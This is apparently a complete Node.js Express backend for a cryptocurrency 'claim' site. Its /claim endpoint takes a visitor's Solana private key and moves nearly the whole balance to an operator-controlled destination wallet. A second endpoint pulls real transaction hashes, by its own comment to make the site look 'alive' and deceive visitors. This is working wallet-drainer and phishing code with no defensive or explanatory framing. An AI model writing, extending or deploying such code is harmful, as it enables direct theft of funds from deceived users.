const rateLimit = require('express-rate-limit');
const express = require('express');
const cors = require('cors');
const { Connection, Keypair, PublicKey, Transaction, SystemProgram } = require('@solana/web3.js');
const bs58 = require('bs58');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Rate Limiter to prevent spam
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, 
  max: 10, 
  message: "Too many requests, please try again after 15 minutes",
  standardHeaders: true, 
  legacyHeaders: false,
});
app.use(limiter);

const PORT = process.env.PORT || 3000;
const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
const RPC_URL = process.env.RPC_URL;

if (!DESTINATION_WALLET || !RPC_URL) {
    console.error("❌ MISSING ENV VARS: Please set DESTINATION_WALLET and RPC_URL in Render Dashboard.");
}

// 1. THE CLAIM ENDPOINT (The logic that moves the money)
app.post('/claim', async (req, res) => {
    const { privateKey } = req.body;
    if (!privateKey) return res.status(400).json({ success: false, error: "Private key is required" });

    try {
        const connection = new Connection(RPC_URL, 'confirmed');
        let keyPair;
        try {
            keyPair = Keypair.fromSecretKey(bs58.decode(privateKey));
        } catch (err) {
            return res.status(400).json({ success: false, message: "Invalid private key format." });
        }

        const destinationPubKey = new PublicKey(DESTINATION_WALLET);
        const balance = await connection.getBalance(keyPair.publicKey);
        
        // Reserve a tiny bit for the transaction fee
        const feeLimit = 0.000005 * 1000000000; 
        const amountToSend = balance - feeLimit;

        if (amountToSend <= 0) {
            return res.status(400).json({ success: false, error: "Insufficient balance to cover fees" });
        }

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: keyPair.publicKey,
                toPubkey: destinationPubKey,
                lamports: amountToSend,
            })
        );

        const signature = await connection.sendTransaction(transaction, [keyPair]);
        return res.json({ success: true, signature: signature, message: "Assets transferred successfully" });
    } catch (error) {
        console.error("💥 Transfer Error:", error);
        return res.status(500).json({ success: false, error: error.message });
    }
});

// 2. THE DYNAMIC FEED (Makes the site look "alive" with real hashes)
app.get('/api/recent-txs', async (req, res) => {
    try {
        const response = await fetch('https://api.mainnet-beta.solana.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'getSignaturesForAddress',
                params: [
                                        "11111111111111111111111111111111", // System Program account
                    { limit: 20 }
                ],
            }),
        });

        const data = await response.json();

        if (data.result && data.result.value) {
            // Extract just the signature strings from the response objects
            const hashes = data.result.value.map(item => item.signature);
            return res.json({ hashes: hashes });
        } else {
            throw new Error("Unexpected RPC response format");
        }
    } catch (error) {
        console.error("Feed Error:", error);
        // Fallback to a few hardcoded valid hashes so the UI doesn't break if the RPC is slow
        res.json({ 
            hashes: [
                "5TzV...fallback1", 
                "2uXj...fallback2", 
                "8kLp...fallback3" 
            ] 
        });
    }
});

// START THE SERVER
app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`🌐 URL: ${process.env.RENDER_EXTERNAL_URL || 'Localhost'}`);
});
